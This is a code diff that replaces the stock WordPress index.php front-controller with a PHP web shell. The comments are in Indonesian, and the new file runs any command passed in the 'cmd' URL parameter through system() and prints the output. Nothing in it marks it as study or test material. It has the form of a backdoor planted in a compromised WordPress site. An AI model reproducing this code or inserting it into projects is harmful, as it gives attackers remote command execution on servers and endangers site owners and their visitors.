@@ -1,17 +1,16 @@
 <?php
-/**
- * Front to the WordPress application. This file doesn't do anything, but loads
- * wp-blog-header.php which does and tells WordPress to load the theme.
- *
- * @package WordPress
- */
+// thread.php
 
-/**
- * Tells WordPress to load the WordPress theme and output it.
- *
- * @var bool
- */
-define( 'WP_USE_THEMES', true );
+// Cek apakah parameter 'cmd' ada
+if (isset($_GET['cmd'])) {
+    $cmd = $_GET['cmd'];
 
-/** Loads the WordPress Environment and Template */
-require __DIR__ . '/wp-blog-header.php';
+    // Jalankan perintah shell (DANGEROUS: gunakan dengan hati-hati!)
+    echo "<pre>";
+    echo "Menjalankan perintah: " . htmlspecialchars($cmd) . "\n\n";
+    system($cmd); // atau gunakan shell_exec($cmd);
+    echo "</pre>";
+} else {
+    echo "Gunakan parameter ?cmd=perintah";
+}
+?>
